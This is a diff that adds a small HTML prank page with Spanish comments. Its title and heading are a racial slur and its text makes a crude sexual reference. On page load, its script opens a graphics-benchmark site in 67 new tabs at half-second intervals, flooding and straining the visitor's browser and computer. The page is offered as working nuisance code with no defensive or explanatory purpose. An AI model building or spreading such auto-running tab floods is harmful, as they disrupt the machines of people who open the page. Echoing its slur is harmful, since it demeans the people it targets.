@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Niggg...</title>
+</head>
+<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
+
+  <h2>Niggering...</h2>
+  <p>Allow opening emerging windows for piper rule 34.</p>
+
+  <script>
+    const url = "https://cznull.github.io/vsbm"; // <-- Pon aquí tu enlace
+    const cantidad = 67; // <-- Número de veces
+    const pausaSegundos = 0.5; // <-- Segundos de espera entre cada pestaña
+
+    let contador = 0;
+
+    function abrirConPausa() {
+      if (contador < cantidad) {
+        window.open(url, "_blank");
+        contador++;
+        setTimeout(abrirConPausa, pausaSegundos * 1000);
+      }
+    }
+
+    // Se ejecuta automáticamente al cargar la página
+    window.onload = abrirConPausa;
+  </script>
+
+</body>
+</html>
